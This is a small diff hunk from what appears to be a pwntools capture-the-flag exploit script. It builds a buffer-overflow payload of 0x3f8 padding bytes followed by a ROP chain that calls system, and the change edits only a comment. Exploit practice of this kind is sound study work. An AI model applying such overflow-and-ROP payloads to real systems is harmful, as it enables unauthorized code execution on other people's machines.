@@ -33,7 +33,7 @@ rop.raw(e.sym.system)
 
 # show the ROP chain we came up with
 print(rop.dump())
-payload = b'A' * 0x3f8 + rop.chain()  # we can see the array is 0x3f8 down the stack in Ghidra, plus 0x10 so we align with the return pointer 
+payload = b'A' * 0x3f8 + rop.chain()  # we can see the array is 0x3f8 down the stack in Ghidra
 print(payload)
 
 # PWN
